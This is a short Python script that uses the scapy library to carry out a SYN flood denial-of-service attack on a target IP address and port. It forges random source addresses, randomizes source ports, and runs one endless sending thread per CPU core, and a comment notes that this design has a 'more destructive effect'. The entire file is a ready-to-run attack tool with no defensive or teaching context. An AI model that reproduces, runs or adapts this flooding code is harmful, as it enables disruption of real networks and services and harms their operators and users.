#!/usr/bin/env python

import sys
import random
import logging
import threading
import multiprocessing
import scapy.all as scapy

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

cpu_count = multiprocessing.cpu_count()
total_packets = 0


def send_syn_packet(ip, port):
    ip_layer = scapy.IP()
    tcp_layer = scapy.TCP()

    ip_layer.src = '%i.%i.%i.%i' % (
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254)
    )
    tcp_layer.sport = random.randint(1, 65535)
    tcp_layer.flags = 'S'

    ip_layer.dst = ip
    tcp_layer.dport = port

    scapy.send(ip_layer / tcp_layer, verbose=0)


def syn_flood(ip, port):
    global total_packets

    while True:
        send_syn_packet(ip, port)
        total_packets += 1

        if total_packets % 100 == 0:
            print('Total packets: %i' % total_packets)


def main():
    if len(sys.argv) != 4:
        print('%s <Interface> <Target IP> <Target port>' % sys.argv[0])
        sys.exit(1)

    print('Flooding is started...')

    scapy.conf.iface = sys.argv[1]

    # has more destructive effect than loop=1 in send()
    for i in range(cpu_count):
        threading.Thread(
            target=syn_flood,
            args=(sys.argv[2], int(sys.argv[3]))
        ).start()


if __name__ == '__main__':
    main()
